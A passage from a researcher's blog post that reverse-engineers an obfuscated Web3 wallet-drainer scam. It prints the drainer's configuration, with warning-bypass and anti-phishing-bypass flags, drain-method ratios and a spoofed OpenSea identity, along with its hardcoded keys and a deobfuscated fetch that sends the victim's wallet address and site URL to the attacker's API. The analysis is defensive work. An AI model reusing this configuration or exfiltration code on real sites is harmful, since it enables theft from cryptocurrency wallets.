+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_0x476324[<span class="string">"disable_dev_tool"</span>]) {</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">window</span>[<span class="string">"DisableDevtool"</span>]) {</span><br><span class="line">        location[<span class="string">"reload"</span>]();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">    <span class="title class_">DisableDevtool</span>()</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>0x476324</code> variable seems interesting. It appears to be a config file, as shown below, revealing the website’s intention of draining the user’s wallet. There is a key called <code>api</code>. I want to know its function, so let’s dig into it.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"api"</span>: <span class="string">"https://web3-api.click"</span>,</span><br><span class="line">    <span class="string">"customer_id"</span>: <span class="string">"clath"</span>,</span><br><span class="line">    <span class="string">"hardcoded"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"connect_buttons_class"</span>: <span class="string">"interact-button"</span>,</span><br><span class="line">    <span class="string">"drain_buttons_class"</span>: <span class="string">"interact-button"</span>,</span><br><span class="line">    <span class="string">"disconnect_buttons_class"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="string">"connect_text"</span>: <span class="string">"Connect Wallet"</span>,</span><br><span class="line">    <span class="string">"connected_text"</span>: <span class="string">"Connected As {wallet}"</span>,</span><br><span class="line">    <span class="string">"loading_text"</span>: <span class="string">"Verifying"</span>,</span><br><span class="line">    <span class="string">"verify_text"</span>: <span class="string">"Please Verify"</span>,</span><br><span class="line">    <span class="string">"drain_button_waiting_click_text"</span>: <span class="string">"Claim"</span>,</span><br><span class="line">    <span class="string">"change_chain_text"</span>: <span class="string">"Please Switch Chain"</span>,</span><br><span class="line">    <span class="string">"not_eligible_text"</span>: <span class="string">"You Are Not Eligible"</span>,</span><br><span class="line">    <span class="string">"disconnect_text"</span>: <span class="string">"Disconnect"</span>,</span><br><span class="line">    <span class="string">"transfer_function_name"</span>: <span class="string">"Claim"</span>,</span><br><span class="line">    <span class="string">"wallet_connect_project_id"</span>: <span class="string">"02f0a71c89a40a32ddf1358ee96d30ce"</span>,</span><br><span class="line">    <span class="string">"trust_sign_text"</span>: <span class="string">"Verify ownership: {wallet}"</span>,</span><br><span class="line">    <span class="string">"theme"</span>: <span class="string">"dark"</span>,</span><br><span class="line">    <span class="string">"images_path"</span>: <span class="string">"./images"</span>,</span><br><span class="line">    <span class="string">"hidden_chain_name"</span>: <span class="string">"Merge"</span>,</span><br><span class="line">    <span class="string">"disable_eth_sign_if_wallet_connect"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"disable_eth_sign_if_metamask"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_increase_allowance_when_available"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_token_transfer_if_increase_allowance_not_available"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_opensea_transfers"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_contract_for_balance"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_multi_functions_contract"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"enable_popup"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"popup_prompt_change_chain"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"popup_prompt_ask_confirm"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"popup_prompt_ask_confirm_only_one_time"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"trust_sign_use_typed_data"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"log_prompts"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"log_chains_accepts"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"disable_dev_tool"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"create_wallet_for_seaport"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"refresh_at_end"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_warnings_bypass_1"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"reload_if_not_eligible"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"auto_prompt"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"wallet_connect_style_v3"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_ratio"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_warnings_bypass_2"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"use_warnings_bypass_3"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"auto_load_files"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">"popup_style"</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">"popup_5_max_time_before_auto_close"</span>: <span class="number">30000</span>,</span><br><span class="line">    <span class="string">"popup_6_max_time_before_auto_close"</span>: <span class="number">30000</span>,</span><br><span class="line">    <span class="string">"modal_style"</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="string">"risk_ratio"</span>: <span class="number">0.5</span>,</span><br><span class="line">    <span class="string">"min_ratio_for_ask_change_chain"</span>: <span class="number">0.95</span>,</span><br><span class="line">    <span class="string">"min_wallet_total_value"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"retry_count"</span>: <span class="number">50</span>,</span><br><span class="line">    <span class="string">"max_change_chain_retry"</span>: <span class="number">50</span>,</span><br><span class="line">    <span class="string">"nfts_api"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"tokens_api"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"max_slippage_on_swap"</span>: <span class="number">50</span>,</span><br><span class="line">    <span class="string">"only_chain_to_drain"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"popup_2_config"</span>: {</span><br><span class="line">        <span class="string">"title"</span>: <span class="string">"Pending..."</span>,</span><br><span class="line">        <span class="string">"message"</span>: <span class="string">"Verify your wallet to continue"</span>,</span><br><span class="line">        <span class="string">"max_time_before_auto_close"</span>: <span class="number">7500</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"popup_3_config"</span>: {</span><br><span class="line">        <span class="string">"title"</span>: <span class="string">"Please swap your NFT Voucher to claim $2000 USDC"</span>,</span><br><span class="line">        <span class="string">"max_time_before_auto_close"</span>: <span class="number">15000</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"popup_4_config"</span>: {</span><br><span class="line">        <span class="string">"open_function"</span>: <span class="string">"window.openPopup(param,isError)"</span>,</span><br><span class="line">        <span class="string">"close_function"</span>: <span class="string">"window.closePopup()"</span>,</span><br><span class="line">        <span class="string">"max_time_before_auto_close"</span>: <span class="number">7500</span>,</span><br><span class="line">        <span class="string">"mode"</span>: <span class="number">1</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"wallet_connect_config"</span>: {</span><br><span class="line">        <span class="string">"logo_url"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"background_image"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"background_color"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"accent_color"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"accept_fill_color"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"overlay_background_color"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"font_family"</span>: <span class="string">"'Space Mono', monospace;"</span>,</span><br><span class="line">        <span class="string">"v2_border_radius"</span>: <span class="literal">false</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"modal_11_custom_texts"</span>: {</span><br><span class="line">        <span class="string">"more_wallets"</span>: <span class="string">"I use different wallet"</span>,</span><br><span class="line">        <span class="string">"more_wallets_title"</span>: <span class="string">"Start Exploring Web3"</span>,</span><br><span class="line">        <span class="string">"more_wallets_description"</span>: <span class="string">"Your wallet is the gateway to all things Ethereum, the magical technology that makes it possible to explore web3."</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"methods_risk_ratio"</span>: {</span><br><span class="line">        <span class="string">"blurTransfers"</span>: <span class="number">6</span>,</span><br><span class="line">        <span class="string">"seaport"</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">"permit"</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="string">"permit2"</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="string">"wyvern"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"gmx"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"openseaTransfers"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"x2y2BatchTransfer"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"punkTransfer"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"apeCoinsUnstake"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"swap"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"eigenlayer"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"approvement"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">"tokenTransfer"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">"balanceTransfer"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">"safa"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">"creepzTransfers"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"creepz_transfers"</span>: <span class="number">3</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"config"</span>: {</span><br><span class="line">        <span class="string">"methods_risk_ratio"</span>: <span class="string">"[object Object]"</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"wallet_connect_spoof"</span>: {</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"Opensea"</span>,</span><br><span class="line">        <span class="string">"description"</span>: <span class="string">"Opeanse Official Marketplace"</span>,</span><br><span class="line">        <span class="string">"url"</span>: <span class="string">"https://opensea.io"</span>,</span><br><span class="line">        <span class="string">"icon"</span>: <span class="string">"https://opensea.io/favicon.ico"</span>,</span><br><span class="line">        <span class="string">"enabled"</span>: <span class="literal">false</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"click_everywhere_open_modal"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"wait_click_of_drain_button_to_start"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"change_buttons_text"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_permit2"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_seaport"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_permit"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_swap"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_blur"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_wyvern"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_x2y2_batch_transfer"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"disable_anti_phishing_extensions_bypass"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"use_token_transfer"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"use_window_provider_if_detected"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"prompt_trust_sign"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"hide_poor_connects"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"log_full_site_url"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"balance_transfers_in_last_position"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"safa_in_last_position"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"hide_added_chain"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"drain_only_one_chain"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"use_cache_data"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"wait_page_load"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"configId"</span>: <span class="literal">null</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>To trace the usage of the <code>0x476324['api']</code>, I hook the getter and setter of it using <code>Object.defineProperty</code> as shown below:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(_0x476324, <span class="string">'api'</span>, {</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>) { <span class="keyword">debugger</span>; <span class="keyword">return</span> <span class="string">'https://web3-api.click'</span>; },</span><br><span class="line">  <span class="title function_">set</span>(<span class="params">newValue</span>) { <span class="keyword">debugger</span> }</span><br><span class="line">});</span><br></pre></td></tr></table></figure></div>
+
+<p>It indeed hit our breakpoint! Let’s trace its call stack.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/api-hook.webp" alt="api-hook"></p>
+<p>In <code>_0x3d3492</code>, it fetches the API with <code>_0x1b9465</code> body. Let’s investigate <code>_0x1b9465</code>.</p>
+<h6 id="0x3d3492"><a href="#0x3d3492" class="headerlink" title="_0x3d3492"></a><code>_0x3d3492</code></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The original code</span></span><br><span class="line"><span class="keyword">let</span> _0xb21bb0 = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="title function_">__p_1452585703_calc</span>(_0x14e175[<span class="string">'\u0061\u0070\u0069'</span>] + <span class="string">'\u002f'</span>, _0x513631, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>)), {</span><br><span class="line">    <span class="string">'\u006d\u0065\u0074\u0068\u006f\u0064'</span>: <span class="title function_">_0x5be209</span>(<span class="number">2896</span>),</span><br><span class="line">    <span class="string">'\u0062\u006f\u0064\u0079'</span>: _0x1b9465</span><br><span class="line">});</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_0x6899a5</span>(<span class="keyword">await</span> _0xb21bb0[<span class="string">'\u0074\u0065\u0078\u0074'</span>]())</span><br><span class="line">} <span class="keyword">catch</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_1452585703_calc</span>(<span class="title function_">__p_1452585703_calc</span>(<span class="number">127</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">22</span>)) + <span class="title function_">__p_1452585703_calc</span>(<span class="number">8549</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">22</span>)), <span class="number">1</span> * <span class="number">8676</span>, <span class="title function_">__p_4879216376</span>(-<span class="number">7</span>)), __p_2651934416 = <span class="number">41</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// We can deobfuscate it to</span></span><br><span class="line"><span class="keyword">let</span> _0xb21bb0 = <span class="keyword">await</span> <span class="title function_">fetch</span>(_0x14e175[<span class="string">'api'</span>] + <span class="string">'/ethereum'</span>, {</span><br><span class="line">    <span class="string">'method'</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="string">'body'</span>: _0x1b9465</span><br><span class="line">});</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_0x6899a5</span>(<span class="keyword">await</span> _0xb21bb0[<span class="string">'text'</span>]())</span><br><span class="line">} <span class="keyword">catch</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p><code>_0x1b9465</code> is from the <code>_0x1a0343</code> function. <code>_0x1a0343</code> encrypts  data like <code>customer_id</code>, the victim’s wallet address, and the website’s URL.<br>Note that it uses the key <code>inferno</code>, so it was probably developed by Inferno. (Sunsec told me it was perhaps from Inferno while I presented the research to him.)</p>
+<p>Let’s return to the <code>fetch</code> part of the code.</p>
+<h6 id="The-0x1a0343-function-after-deobfuscation"><a href="#The-0x1a0343-function-after-deobfuscation" class="headerlink" title="The _0x1a0343 function after deobfuscation"></a>The <code>_0x1a0343</code> function after deobfuscation</h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465-deobfscated.webp" alt="_0x1b9465"><br>…<br><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465-deobfscated-2.webp" alt="_0x1b9465-deobfscated-2"></p>
+<h6 id="The-0x1a0343-function-before-deobfuscation"><a href="#The-0x1a0343-function-before-deobfuscation" class="headerlink" title="The _0x1a0343 function before deobfuscation"></a>The <code>_0x1a0343</code> function before deobfuscation</h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465.webp" alt="_0x1b9465"></p>
+<p>After fetching the API, it is called <code>_0x6899a5</code> with the returned data. Let us investigate it.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> _0xb21bb0 = <span class="keyword">await</span> <span class="title function_">fetch</span>(_0x14e175[<span class="string">'api'</span>] + <span class="string">'/ethereum'</span>, {</span><br><span class="line">    <span class="string">'method'</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="string">'body'</span>: _0x1b9465</span><br><span class="line">});</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_0x6899a5</span>(<span class="keyword">await</span> _0xb21bb0[<span class="string">'text'</span>]())</span><br><span class="line">} <span class="keyword">catch</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p><code>_0x6899a5</code> decrypts the data and returns it. Let us investigate the decryption key.</p>
+<h6 id="Deobfuscated-0x6899a5"><a href="#Deobfuscated-0x6899a5" class="headerlink" title="Deobfuscated _0x6899a5"></a>Deobfuscated <code>_0x6899a5</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x6899a5-deobfscated.webp" alt="_0x6899a5-deobfscated"></p>
+<h6 id="The-original-0x6899a5"><a href="#The-original-0x6899a5" class="headerlink" title="The original _0x6899a5"></a>The original <code>_0x6899a5</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x6899a5.webp" alt="_0x6899a5"></p>
+<p>The decryption key is from <code>_0x97a49a</code>. Let’s look into it.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="comment">/* ... */</span>, <span class="attr">BACKEND_DECRYPT_KEY</span>: _0x3c024e} = <span class="title function_">_0x97a49a</span>()</span><br></pre></td></tr></table></figure></div>
+
+<p><code>_0x97a49a()</code> returns the following information, including the hardcoded key. It also reveals the local storage encryption key, indicating that the local storage is likely encrypted. Let us investigate how the decrypted data is used.</p>
+<h6 id="The-0x97a49a-return-data"><a href="#The-0x97a49a-return-data" class="headerlink" title="The _0x97a49a() return data"></a>The <code>_0x97a49a()</code> return data</h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"UNIQUE_VERSION"</span>: <span class="string">"6.8.003"</span>,</span><br><span class="line">    <span class="string">"DEBUG_WALLET"</span>: <span class="literal">false</span>, <span class="comment">/* ... */</span></span><br><span class="line">    <span class="string">"BLUR_FEE_TYPEHASH"</span>: <span class="string">"0x05b43f730f67de334a342883f867101fc7ef3361dfdff4a29a7aa97e0920ef7a"</span>,</span><br><span class="line">    <span class="string">"BLUR_ORDER_TYPEHASH"</span>: <span class="string">"0x376bfbc394a7ba7fdf10f224572cef371358e3053e362f4554fcd2ad56329b3f"</span>,</span><br><span class="line">    <span class="string">"LOCAL_STORAGE_KEY_NAME"</span>: <span class="string">"8gzjkjluo2"</span>,</span><br><span class="line">    <span class="string">"LOCAL_STORAGE_ENCRYPT_KEY"</span>: <span class="string">"xi3z2y8ne3f34yxkbhci8cah8y9ic6q5xkctpfpzg4vvi7b8mmn22brdiee5fbrwdvhhzwi9qfquzktpip9kvvaiyirzfk3gh45p"</span>,</span><br><span class="line">    <span class="string">"BACKEND_DECRYPT_KEY"</span>: <span class="string">"r8hhweybk9ekz62w45qvyjnpz3xguueqg6amhbbghbckpeu8fmzdiivezfbnfxe9puz4thkpx5ejcipp53pcuydpu4yuyxx4rqqu"</span>,</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="string">"METHODS_REQUIERING_VICTIM_TO_PAY_FEES"</span>: [ <span class="comment">/* ... */</span> ],</span><br><span class="line">    <span class="string">"DAPP_CONNECT_URL"</span>: <span class="string">"l.ching367436.me:5501"</span>,</span><br><span class="line">    <span class="string">"IS_VICTIM_ON_MOBILE"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"OS"</span>: <span class="string">"Windows"</span>,</span><br><span class="line">    <span class="string">"MAX_OPENSEA_ELEMENTS"</span>: <span class="number">15</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>The function _0x1e89b9 uses the API return data _0x2612b1. If _0x2612b1[‘blacklisted’], the program will exit. It’s important to note that the API has knowledge of the victim’s address and URL, so the website might blacklist the localhost URL or wallet address belonging to security researchers for security reasons. The drainer address is also specified by the API.</p>
+<h6 id="The-deobfuscated-0x1e89b9"><a href="#The-deobfuscated-0x1e89b9" class="headerlink" title="The deobfuscated _0x1e89b9"></a>The deobfuscated <code>_0x1e89b9</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9-deobfuscated.webp" alt="_0x1e89b9-deobfuscated"></p>
+<p>…</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9-deobfuscated-2.webp" alt="_0x1e89b9-deobfuscated-2"></p>
+<h6 id="The-original-0x1e89b9"><a href="#The-original-0x1e89b9" class="headerlink" title="The original _0x1e89b9"></a>The original <code>_0x1e89b9</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9.webp" alt="_0x1e89b9"></p>
+<h2 id="Automate-the-code-deobfuscation-process"><a href="#Automate-the-code-deobfuscation-process" class="headerlink" title="Automate the code deobfuscation process"></a>Automate the code deobfuscation process</h2><p>Manually deobfuscating the code is effective, but the user experience is bad. I attempted to use existing deobfuscation tools, but they were ineffective. Therefore, I decided to develop my own deobfuscator.</p>
+<p>The original code and the deobfuscation using the existing deobfuscator, as well as the deobfuscation using my deobfuscator, are shown below. Let us see how I achieved this.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-before-deobfuscation.webp" alt="code-before-deobfuscation"></p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-after-deobfuscation.webp" alt="code-after-deobfuscation"></p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-after-my-deobfuscation.webp" alt="code-after-my-deobfuscation"></p>
+<p>Let’s start by identifying the obfuscation in the code. There is a function called <code>__p_0566375197</code> that appears over twenty thousand times. Let us see what it does.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/p_0566375197.webp" alt="p_0566375197"></p>
+<p>It checks if the value of <code>__p_5272508748[x]</code> is present. If it is, it returns the value. If not, it calculates it using <code>__p_6222965791(__p_7737682834[x]))</code> and fills in <code>__p_5272508748[x]</code>, then returns the value. What <code>__p_6222965791</code> does is perform calculations based on its argument. Therefore, we can replace all occurrences of <code>__p_0566375197(x)</code> with its value.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">__p_0566375197</span>(<span class="params">x, y, z, a=__p_6222965791, b=__p_5272508748</span>) {</span><br><span class="line">    <span class="keyword">if</span> (z) {</span><br><span class="line">        <span class="keyword">return</span> y[__p_5272508748[z]] = <span class="title function_">__p_0566375197</span>(x, y)</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (y) {</span><br><span class="line">        [b,y] = [<span class="title function_">a</span>(b), x || z]</span><br><span class="line">    }</span><br><span class="line">    <span 